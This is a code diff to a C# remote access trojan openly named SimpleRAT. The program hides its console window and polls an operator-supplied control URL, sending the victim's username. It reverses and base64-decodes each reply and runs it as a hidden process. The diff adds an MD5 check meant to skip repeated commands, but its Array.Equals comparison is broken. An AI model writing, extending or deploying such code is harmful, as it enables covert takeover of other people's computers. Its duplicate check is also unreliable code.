@@ -5,6 +5,7 @@ using System.Net;
 using System.Threading;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
 
 namespace SimpleRAT
 {
@@ -19,7 +20,8 @@ namespace SimpleRAT
 
         static void Execute(string cmd)
         {
-            try {
+            try
+            {
                 Process p = new Process();
                 ProcessStartInfo startInfo = new ProcessStartInfo();
                 startInfo.WindowStyle = ProcessWindowStyle.Hidden;
@@ -31,13 +33,16 @@ namespace SimpleRAT
                 p.StartInfo = startInfo;
                 p.Start();
 
-            } catch (Exception e) { 
+            }
+            catch (Exception e)
+            {
 
             }
         }
 
         static void Main(string[] args)
         {
+            byte[] currentMd5 = { };
             ShowWindow(GetConsoleWindow(), 0);
             if (Environment.GetEnvironmentVariable("USERDOMAIN") == "CHANGEME")
             {
@@ -51,15 +56,23 @@ namespace SimpleRAT
 
                 while (true)
                 {
-                        byte[] cmd = client.DownloadData(args[0] + "?" + Environment.GetEnvironmentVariable("USERNAME"));
-                        Array.Reverse(cmd, 0, cmd.Length);
-                        string run =  Encoding.ASCII.GetString(Convert.FromBase64String(Encoding.ASCII.GetString(cmd)));
-                    if (run.Length > 0)
+                    byte[] cmd = client.DownloadData(args[0] + "?" + Environment.GetEnvironmentVariable("USERNAME"));
+                    Array.Reverse(cmd, 0, cmd.Length);
+                    string run = Encoding.ASCII.GetString(Convert.FromBase64String(Encoding.ASCII.GetString(cmd)));
+
+                    MD5 md5 = MD5.Create();
+                    byte[] md5Result = md5.ComputeHash(Encoding.ASCII.GetBytes(run));
+
+                    if (!Array.Equals(md5Result, currentMd5))
                     {
-                        Thread t = new Thread(() => Execute(run));
-                        t.Start();
-                        Thread.Sleep(10000);
-                    }                   
+                        if (run.Length > 0)
+                        {
+                            Thread t = new Thread(() => Execute(run));
+                            t.Start();
+                            Thread.Sleep(10000);
+                        }
+                    }
+                    currentMd5 = md5Result;
                 }
             }
         }
